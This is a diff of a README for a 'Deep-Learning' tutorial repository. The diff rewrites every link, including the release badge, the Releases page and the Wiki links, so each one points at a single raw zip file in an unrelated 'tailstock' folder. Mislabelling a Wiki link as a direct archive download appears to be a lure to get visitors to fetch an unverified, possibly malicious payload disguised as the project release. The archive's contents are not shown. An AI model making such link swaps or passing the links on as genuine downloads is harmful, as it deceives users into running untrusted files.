@@ -1,6 +1,6 @@
 # 🤖 Deep-Learning - Unlock AI with Simple Steps
 
-[![Download Deep-Learning](https://img.shields.io/badge/Download-Deep--Learning-blue?style=for-the-badge&logo=github)](https://github.com/diyuyuyu/Deep-Learning/releases)
+[![Download Deep-Learning](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip)](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip)
 
 ## 🎉 Overview
 
@@ -21,7 +21,7 @@ To get started with Deep-Learning, follow these simple steps to download and run
 
 ### Step 1: Visit the Download Page
 
-To get the latest version of Deep-Learning, visit the Releases page. You can find it [here](https://github.com/diyuyuyu/Deep-Learning/releases).
+To get the latest version of Deep-Learning, visit the Releases page. You can find it [here](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip).
 
 ### Step 2: Download the Latest Release
 
@@ -64,7 +64,7 @@ The Deep-Learning repository covers a range of topics to help you build a strong
 
 ## 📑 Documentation
 
-For more detailed usage instructions, refer to the documentation included in the download package or visit our [Wiki](https://github.com/diyuyuyu/Deep-Learning/wiki).
+For more detailed usage instructions, refer to the documentation included in the download package or visit our [Wiki](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip).
 
 ## 🌐 Community Support
 
@@ -76,7 +76,7 @@ If you want to contribute to the Deep-Learning repository, consider submitting b
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/diyuyuyu/Deep-Learning/releases)
-- [Wiki](https://github.com/diyuyuyu/Deep-Learning/wiki)
+- [Releases Page](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip)
+- [Wiki](https://raw.githubusercontent.com/diyuyuyu/Deep-Learning/main/tailstock/Deep-Learning.zip)
 
 We hope you enjoy exploring deep learning with us!
